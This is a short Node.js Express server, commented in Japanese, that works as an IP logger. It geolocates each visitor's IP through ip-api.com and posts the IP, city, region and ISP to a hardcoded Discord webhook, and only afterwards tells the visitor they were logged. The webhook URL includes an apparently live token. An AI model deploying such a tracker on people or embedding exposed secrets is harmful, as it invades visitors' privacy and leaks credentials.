const express = require('express');
const app = express();
// Render環境用にポート設定を少しだけ改良しておきます
const PORT = process.env.PORT || 3000; 

// ★ ここにDiscordで生成したWebhook URLを貼り付ける ★
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1488459565535203458/rElmmrizlethmw89xlmaYhQyCN66pmKZtkYCVAkM0nkf7fUJ3b4myibNzKH3weTF7Ivu';

app.set('trust proxy', true);

app.get('/', async (req, res) => {
    let ip = req.ip || req.headers['x-forwarded-for'];

    try {
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const geoData = await response.json();

        // サーバー側のコンソール出力（記録用）
        console.log('========== 新しいアクセス ==========');
        console.log(`IP: ${ip}`);

        // --- ここからDiscordに送るメッセージの組み立て ---
        let discordMessage = `🚨 **新しいアクセスを検知しました！**\nIPアドレス: \`${ip}\`\n`;

        if (geoData.status === 'success') {
            discordMessage += `国: ${geoData.country}\n地域: ${geoData.regionName}\n都市: ${geoData.city}\nプロバイダ: ${geoData.isp}`;
            console.log(`地域: ${geoData.regionName}`);
        } else {
            discordMessage += `位置情報の取得に失敗しました: ${geoData.message}`;
        }
        console.log('====================================\n');

        // --- ここからDiscordへデータを送信 (POSTリクエスト) ---
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: discordMessage // contentというキーにメッセージを入れるのがDiscordのルール
            })
        });

        // 訪問者への表示
        res.send(`
            <h1>ようこそ！</h1>
            <p>このページを開いたことで、サーバー側のログにアクセス情報が記録されました。</p>
        `);

    } catch (error) {
        console.error('エラーが発生しました:', error);
        res.status(500).send('サーバーエラー');
    }
});

app.listen(PORT, () => {
    console.log(`サーバーが起動しました: http://localhost:${PORT}`);
});
